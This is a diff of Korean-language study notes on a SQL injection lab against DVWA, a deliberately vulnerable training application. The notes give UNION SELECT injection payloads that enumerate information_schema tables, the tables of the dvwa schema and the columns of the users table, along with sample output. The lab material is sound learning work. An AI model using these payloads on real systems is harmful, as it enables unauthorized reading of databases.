@@ -31,7 +31,7 @@
 - DB 정보와 버전을 알면 취약점을 찾을 수 있다.![[Pasted image 20241008111340.png]]
 - `5' union select table_schema,2 from information_schema.tables#` > 데이터 테이블 구조를 1번 칼럼에 출력하고 스키마의 테이블 수를 출력해라 는 명령어![[Pasted image 20241008112310.png]]
   (첫번째 출력은 5번째 사용자 이름을 출력하는 내용)
-- `5' union select 1,table_name from information_schema.tables#` > 스키마에서 테이블 이름을 가져오는 sql 구문
+- `5' union select 1,table_name from information_schema.tables#` > 스키마에서 모든데이터 베이스의 테이블 이름들을 가져오는 sql 구문
 	```
 	ID: 5' union select 1,table_name from information_schema.tables#  
 	First name: Bob  
@@ -250,4 +250,5 @@
 	Surname: user
 	```
 	- table_name에는 DB에 사용되는 table들의 이름들이 모두 저장되도록 sql에서 기본 설정되어 있기 때문에 사용자가 임의의 작업을 하지 않았다면 테이블 이름들을 확인 할 수 있다.
-- `5' union select 1,table_name from information_schema.tables where#`
+- `5' union select 1,table_name from information_schema.tables where table_schema='dvwa'#` > dvwa DB의 테이블만 가져오는 구문![[Pasted image 20241008113053.png]]
+- `5' union select 1, column_name from information_schema.columns where table_name='users'#`![[Pasted image 20241008113428.png]]
